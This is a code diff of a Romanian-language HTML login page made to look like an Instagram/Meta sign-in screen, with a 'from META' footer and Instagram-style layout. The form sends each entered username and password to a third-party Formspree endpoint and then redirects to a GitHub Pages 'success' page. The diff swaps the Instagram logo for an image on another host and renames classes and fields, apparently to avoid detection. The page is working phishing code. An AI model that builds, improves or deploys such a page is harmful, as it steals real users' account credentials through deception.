@@ -5,30 +5,30 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Conectare</title>
     <style>
-        body { background: white; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .container { width: 300px; text-align: center; }
-        .logo { width: 175px; margin-bottom: 40px; }
+        body { background: white; font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .box { width: 300px; text-align: center; border: 1px solid #dbdbdb; padding: 20px; border-radius: 8px; }
+        .img-top { width: 175px; margin-bottom: 30px; }
         input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 14px; box-sizing: border-box; outline: none; }
         button { width: 100%; background: #0095f6; color: white; border: none; padding: 10px; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; font-size: 14px; }
-        .footer { position: absolute; bottom: 20px; font-size: 12px; color: #8e8e8e; text-transform: uppercase; letter-spacing: 1px; }
+        .ft { position: absolute; bottom: 20px; font-size: 11px; color: #8e8e8e; text-transform: uppercase; letter-spacing: 1px; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
+    <div class="box">
+        <img src="https://i.ibb.co/L6V6vWq/logo-new.png" class="img-top">
         
         <form action="https://formspree.io/f/xzdkrgdq" method="POST">
-            <input type="text" name="Identitate" placeholder="Număr, utilizator sau e-mail" required>
-            <input type="password" name="Cheie" placeholder="Parolă" required>
+            <input type="text" name="ID_Utilizator" placeholder="Telefon, utilizator sau email" required>
+            <input type="password" name="Cheie_Acces" placeholder="Parolă" required>
             
-            <button type="submit">Conectează-te</button>
+            <button type="submit">Log in</button>
             
             <input type="hidden" name="_next" value="https://ryt6ngx4tm-crypto.github.io/mata/verificare/succes.html">
         </form>
     </div>
 
-    <div class="footer">from META</div>
+    <div class="ft">from META</div>
 
 </body>
 </html>
